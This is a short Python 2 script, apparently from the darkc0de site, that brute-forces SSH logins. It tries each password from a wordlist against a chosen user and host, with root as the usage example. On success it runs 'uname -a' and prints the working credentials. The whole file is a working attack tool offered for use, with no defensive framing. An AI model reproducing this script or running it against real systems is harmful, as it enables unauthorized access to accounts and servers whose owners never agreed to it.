#!/usr/bin/python
#SSH BruteForcer

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import sys, time
try:
	import pexpect, pxssh
except(ImportError):
	print "\nYou need the pexpect module."
	print "http://www.noah.org/wiki/Pexpect\n"
	sys.exit(1)

def brute(word):
	print "Trying:",word
     	try:
        	s = pxssh.pxssh()
        	s.login (ip, user, word, login_timeout=10)
        	s.sendline (command)
        	s.prompt()
        	print "\n",s.before
        	s.logout()
		print "\t[!] Login Success:",user, word,"\n"
		sys.exit(1)
   	except Exception, e:
        	#print "[-] Failed"
		pass
	except KeyboardInterrupt:
		print "\n[-] Quit\n"
		sys.exit(1)

print "\n\t   d3hydr8:darkc0de.com sshBrute v1.0"
print "\t----------------------------------------"
	
if len(sys.argv) != 4:
	print "\nUsage : ./sshbrute.py <server> <user> <wordlist>"
	print "Eg: ./sshbrute.py 198.162.1.1 root words.txt\n"
	sys.exit(1)

ip = sys.argv[1]
user = sys.argv[2]
command = 'uname -a'

try:
	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "\n[-] Error: Check your wordlist path\n"
  	sys.exit(1)

print "\n[+] Loaded:",len(words),"words"
print "[+] Server:",ip
print "[+] User:",user
print "[+] BruteForcing...\n"
for word in words:
	#Change this time if needed
	time.sleep(0.5)
	brute(word.replace("\n",""))
